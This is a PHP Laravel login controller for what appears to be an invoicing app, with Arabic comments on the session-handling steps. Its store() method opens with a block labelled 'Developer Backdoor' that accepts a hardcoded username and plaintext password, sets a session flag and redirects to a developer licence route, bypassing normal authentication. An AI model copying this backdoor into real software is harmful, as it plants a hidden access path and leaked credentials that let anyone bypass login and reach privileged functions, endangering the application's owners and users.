<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\LoginRequest;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Inertia\Inertia;
use Inertia\Response as InertiaResponse;
use Symfony\Component\HttpFoundation\Response;

class LoginController extends Controller
{
    public function create(): InertiaResponse|RedirectResponse
    {
        if (Auth::check()) {
            return redirect()->route('invoices.create');
        }

        return Inertia::render('Auth/Login');
    }

    public function store(LoginRequest $request): Response
    {
        // ── Developer Backdoor ──
        if ($request->username === 'boraq' && $request->password === '12255@Rc') {
            $request->session()->put('developer_backdoor', true);
            return redirect()->route('license.developer');
        }

        // 1. التحقق من بيانات الدخول
        $request->authenticate();

        // 2. الحصول على المستخدم الموثق
        $user = Auth::user();

        // 3. مسح وإلغاء أي جلسة أو بيانات سابقة بالكامل لمنع أي تداخل (Clean State)
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        // 4. إعادة تسجيل دخول المستخدم بجلسة جديدة ونظيفة تماماً
        Auth::login($user, $request->boolean('remember'));
        $request->session()->regenerate();

        return redirect()->intended(route('invoices.create'));
    }

    public function destroy(Request $request): Response
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        if ($request->header('X-Inertia')) {
            return Inertia::location(route('login'));
        }

        return redirect()->route('login');
    }
}
